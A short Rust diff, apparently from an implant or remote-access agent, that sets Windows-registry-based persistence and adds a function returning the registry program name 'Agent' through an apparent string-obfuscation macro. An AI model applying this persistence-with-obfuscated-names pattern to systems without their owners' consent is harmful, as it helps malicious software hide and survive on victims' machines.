@@ -17,6 +17,13 @@ pub enum Persistence {
     WinRegistryBased,
 }
 
+#[inline]
 pub fn persistence() -> Persistence {
     return Persistence::WinRegistryBased;
+}
+
+// Relates to Persistence::WinRegistryBased
+#[inline]
+pub fn get_reg_program_name() -> String {
+    goldberg_string!("Agent").to_string()
 }
